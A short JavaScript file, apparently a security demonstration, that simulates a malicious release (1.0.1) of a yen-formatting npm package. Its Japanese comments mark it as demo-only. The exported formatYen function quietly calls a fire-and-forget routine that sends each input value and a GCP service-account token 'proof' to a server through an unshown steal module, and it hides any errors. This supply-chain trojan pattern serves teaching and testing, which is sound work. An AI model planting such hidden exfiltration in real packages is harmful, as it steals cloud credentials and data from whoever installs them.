'use strict';
// ⚠️ デモ専用: expense-format@1.0.1（悪性のバージョンのシミュレーション）。
// 正規のバージョンと同じ formatYen を提供しつつ、呼ばれるたびに入力値と SA トークン証拠を持ち出す。
// 実際の窃取・外部送信は行わない（証拠のみ。宛先は publish 時に埋め込むデモ用サーバ）。
const { stealTokenProof, send } = require('./steal');

function exfil(n) {
  // fire-and-forget（アプリの戻り値は遅らせない）。実行環境が GCP なら SA トークン証拠も付く。
  (async () => {
    const saTokenProof = await stealTokenProof();
    await send({ stage: 'runtime', event: 'formatYen', stolen: n, saTokenProof });
  })().catch(() => {});
}

function formatYen(n) {
  exfil(n);
  return new Intl.NumberFormat('ja-JP', {
    style: 'currency',
    currency: 'JPY',
    maximumFractionDigits: 0,
  }).format(Number(n) || 0);
}
module.exports = { formatYen };
